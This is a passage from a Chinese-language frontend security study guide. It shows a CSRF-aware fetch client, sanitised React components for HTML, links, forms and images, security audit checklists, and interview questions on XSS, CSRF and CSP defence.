      'Content-Type': 'application/json',
      'X-CSRF-Token': this.csrfToken,
      ...options.headers,
    };

    const res = await fetch(`${this.baseUrl}${path}`, {
      method,
      credentials: 'same-origin', // 只发送同源 cookie
      headers,
      body: options.body ? JSON.stringify(options.body) : undefined,
    });

    // Token 过期，重新获取并重试
    if (res.status === 403) {
      await this.init();
      return this.request(method, path, options);
    }

    if (!res.ok) {
      const error = await res.json().catch(() => ({ error: 'Unknown error' }));
      throw new Error(error.error || `HTTP ${res.status}`);
    }

    return res.json();
  }

  // GET (无 CSRF 需求)
  async get(path) {
    return this.request('GET', path);
  }

  // POST (需要 CSRF)
  async post(path, body) {
    return this.request('POST', path, { body });
  }

  // PUT (需要 CSRF)
  async put(path, body) {
    return this.request('PUT', path, { body });
  }

  // DELETE (需要 CSRF)
  async delete(path) {
    return this.request('DELETE', path);
  }
}
```

### 5.3 安全 React 组件

```javascript
// ========== 安全 React 组件模式 ==========

// 1. 安全的 HTML 渲染 (使用 DOMPurify)
import DOMPurify from 'dompurify';

const SafeHTMLRenderer = ({ html }) => (
  <div
    dangerouslySetInnerHTML={{
      __html: DOMPurify.sanitize(html, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
        ALLOWED_ATTR: ['href', 'title'],
        ALLOWED_URI_REGEXP: /^(https?|mailto):\/\//i,
      }),
    }}
  />
);

// 2. 安全的 URL 渲染
const SafeLink = ({ href, children }) => {
  const safeHref = (() => {
    try {
      const url = new URL(href, window.location.origin);
      if (url.protocol === 'http:' || url.protocol === 'https:') {
        return url.href;
      }
    } catch { /* invalid URL */ }
    return '#';
  })();

  return (
    <a
      href={safeHref}
      rel="noopener noreferrer" // 防 reverse tabnabbing
      target="_blank"
    >
      {children}
    </a>
  );
};

// 3. 安全的表单
const SecureForm = () => {
  const [csrfToken, setCsrfToken] = useState(null);

  useEffect(() => {
    fetch('/api/csrf-token')
      .then(r => r.json())
      .then(data => setCsrfToken(data.csrfToken));
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);

    await fetch('/api/submit', {
      method: 'POST',
      credentials: 'same-origin',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      },
      body: JSON.stringify(Object.fromEntries(formData)),
    });
  };

  return (
    <form onSubmit={handleSubmit}>
      <input type="hidden" name="_csrf" value={csrfToken} />
      {/* 表单字段 */}
      <button type="submit">Submit</button>
    </form>
  );
};

// 4. 安全的图片渲染
const SafeImage = ({ src, alt }) => {
  const [error, setError] = useState(false);

  const safeSrc = (() => {
    if (!src || typeof src !== 'string') return '';
    if (src.startsWith('data:') || src.startsWith('blob:')) {
      // 检查 data URI 类型
      if (!src.startsWith('data:image/')) return '';
    }
    return src;
  })();

  if (error || !safeSrc) return null;

  return (
    <img
      src={safeSrc}
      alt={alt || ''}
      referrerPolicy="no-referrer" // 不泄露 referrer
      onError={() => setError(true)}
      loading="lazy"
    />
  );
};
```

---

## 六、安全审计清单

### 6.1 前端安全清单

```
□ XSS 防护
  □ 所有用户输入使用 textContent / 框架转义
  □ dangerouslySetInnerHTML / v-html 配合 DOMPurify
  □ innerHTML 赋值前净化
  □ eval() / new Function() 已移除
  □ setTimeout/setInterval 字符串调用已移除
  □ document.write 已移除

□ CSRF 防护
  □ SameSite Cookie 已设置
  □ CSRF Token 验证 (POST/PUT/DELETE)
  □ Origin/Referer 验证
  □ 敏感操作要求二次验证

□ CSP
  □ Content-Security-Policy 头已设置
  □ 不使用 unsafe-inline (用 nonce/hash)
  □ 不使用 unsafe-eval
  □ frame-ancestors: none
  □ report-uri 已配置

□ 其他
  □ HttpOnly Cookie
  □ Secure Cookie (HTTPS only)
  □ X-Content-Type-Options: nosniff
  □ X-Frame-Options: DENY
  □ referrer-policy 已设置
  □ 敏感数据不存储在 localStorage
  □ API 密钥不在前端代码中
  □ 依赖库已更新 (npm audit)
```

### 6.2 后端安全清单

```
□ 输入验证
  □ 所有输入已验证 (类型/长度/格式/范围)
  □ 使用白名单而非黑名单
  □ SQL 参数化查询
  □ 文件上传类型/大小限制

□ 认证 & 授权
  □ 密码 bcrypt/scrypt 哈希
  □ Session 固定攻击防护
  □ JWT 签名验证 + 过期检查
  □ RBAC 权限检查

□ 安全配置
  □ Helmet 中间件
  □ 速率限制
  □ CORS 白名单
  □ 错误信息不泄露敏感数据
  □ 日志不记录密码/token

□ 依赖安全
  □ npm audit 无高危漏洞
  □ 锁定依赖版本 (package-lock.json)
  □ 定期更新依赖
```

---

## 七、面试自测题

### 7.1 XSS

1. 三种 XSS 的区别是什么？各自的防御方式？
2. React/Vue 如何防止 XSS？什么情况下会失效？
3. `dangerouslySetInnerHTML` 为什么危险？如何安全使用？
4. CSP 能完全防止 XSS 吗？为什么？
5. 如何防御 DOM-based XSS？

### 7.2 CSRF

1. CSRF 攻击的原理是什么？为什么 Cookie 自动携带是问题？
2. SameSite Cookie 如何防御 CSRF？strict vs lax 的区别？
3. CSRF Token 的工作原理？为什么攻击者无法获取？
4. 双重 Cookie 验证的原理？相比 CSRF Token 的优劣？
5. 什么情况下 CSRF 攻击不会成功？

### 7.3 净化 & CSP

1. 输入净化应该在客户端还是服务端？为什么？
2. 富文本 (允许 HTML) 如何安全渲染？
3. CSP 的 nonce 和 hash 有什么区别？
4. 渐进式部署 CSP 的步骤？
5. 如何测试 CSP 策略是否有效？

### 7.4 综合

1. 设计一个安全的用户注册系统，考虑所有安全因素。
2. 如何防御文件上传漏洞？
3. 前后端分离架构下的 CSRF 防御方案？
4. SPA 应用的 CSP 策略如何配置？
5. 发现 XSS 漏洞后的应急响应流程？

---

## 八、总结

### 核心原则

1. **永远不要信任用户输入** — 所有输入都要验证和净化
2. **纵深防御** — 多层防护，单层失效不致命
3. **最小权限** — CSP 只允许必要的来源
4. **安全默认** — 框架默认转义，不主动关闭
5. **持续更新** — 依赖库、CSP 策略、安全配置定期审查

### 防御优先级

```
P0 (必须):
  - 输入验证 + 净化
  - 参数化 SQL 查询
  - SameSite Cookie
  - CSP (至少 report-only)

P1 (重要):
  - CSRF Token
  - HttpOnly + Secure Cookie
  - 速率限制
  - Helmet 安全头

P2 (建议):
  - CSP nonce/hash
  - 双重 Cookie 验证
  - Origin/Referer 检查
  - SRI (Subresource Integrity)
```

---

*训练完成 | 覆盖: XSS 攻防 / CSRF 攻防 / 输入净化 / CSP / 安全代码模式 / 审计清单*
